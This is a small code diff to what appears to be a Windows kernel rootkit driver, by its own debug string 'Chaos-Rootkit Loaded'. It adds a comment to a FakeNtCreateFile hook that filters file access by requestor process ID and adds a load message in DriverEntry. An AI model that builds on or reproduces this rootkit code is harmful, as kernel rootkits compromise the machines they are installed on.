@@ -218,7 +218,7 @@ NTSTATUS WINAPI FakeNtCreateFile(
 
                     DbgPrint("requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));
 
-                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid)
+                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid) // more testing need to be done at this part ,used 0 to avoid restricting the same process ...
                     {
 
                         DbgPrint("process allowed\n");
@@ -999,8 +999,10 @@ DriverEntry(
     PUNICODE_STRING registryPath
 )
 {
-    ExInitializePushLock(&pLock);
 
+    DbgPrint("Chaos-Rootkit Loaded ...\n");
+
+    ExInitializePushLock(&pLock);
 
     UNREFERENCED_PARAMETER(registryPath);
     UNREFERENCED_PARAMETER(driverObject);
